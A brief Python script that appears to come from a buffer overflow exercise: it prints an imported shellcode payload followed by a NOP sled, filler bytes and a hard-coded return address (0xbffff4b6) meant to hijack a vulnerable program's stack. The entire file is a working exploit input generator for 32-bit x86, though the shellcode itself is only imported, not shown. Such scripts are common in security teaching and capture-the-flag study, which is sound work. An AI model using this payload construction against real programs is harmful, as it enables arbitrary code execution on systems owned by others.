import sys
from shellcode import shellcode

if __name__ == '__main__':   
        print( shellcode+"\x90"*54 +"\x91"*5 +"\xb6\xf4\xff\xbf")
#0xbffff4b6
